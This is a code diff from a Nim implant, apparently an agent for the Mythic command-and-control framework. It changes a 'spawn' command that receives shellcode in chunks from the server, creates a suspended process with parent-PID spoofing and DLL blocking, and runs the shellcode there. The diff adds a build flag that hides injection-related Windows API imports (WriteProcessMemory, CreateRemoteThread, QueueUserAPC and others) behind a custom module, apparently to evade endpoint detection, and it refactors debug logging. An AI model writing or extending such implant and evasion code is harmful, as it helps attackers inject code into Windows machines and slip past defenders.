@@ -5,7 +5,11 @@ import ../utils/strenc
 import std/[json, strutils, strformat, base64]
 
 when defined(windows):
-  import winim/lean
+  when defined(evasion_dfr):
+    import winim/lean except VirtualAllocEx, VirtualProtectEx, WriteProcessMemory, CreateRemoteThread, OpenProcess, CreateProcessA, ResumeThread, QueueUserAPC
+    import ../utils/winapi
+  else:
+    import winim/lean
   
   const
     PROCESS_CREATE_PROCESS_SPAWN = 0x0080
@@ -171,7 +175,7 @@ proc spawn*(taskId: string, params: JsonNode): JsonNode =
   when defined(windows):
     try:
       let args = to(params, SpawnArgs)
-      debug &"[DEBUG] Spawn: technique={args.technique}, uuid={args.uuid}"
+      debugLog "spawn", &"Spawn: technique={args.technique}, uuid={args.uuid}"
       
       # Return initial response to request the payload file from Mythic
       return %*{
@@ -203,7 +207,7 @@ proc processSpawnChunk*(taskId: string, params: JsonNode, chunkData: string,
       for b in decodedChunk:
         fileData.add(cast[byte](b))
       
-      debug &"[DEBUG] Spawn: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
+      debugLog "spawn", &"Spawn: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
       
       if currentChunk < totalChunks:
         return %*{
@@ -243,7 +247,7 @@ proc executeSpawn*(taskId: string, shellcode: seq[byte], params: JsonNode): Json
       let ppid = getPpid()
       let blockDlls = getBlockDlls()
       
-      debug &"[DEBUG] Spawn: Creating process {spawntoPath} (ppid={ppid}, blockdlls={blockDlls})"
+      debugLog "spawn", &"Spawn: Creating process {spawntoPath} (ppid={ppid}, blockdlls={blockDlls})"
       
       let (success, pi, errorMsg) = createSuspendedProcessSpawn(spawntoPath, ppid, blockDlls)
       if not success:
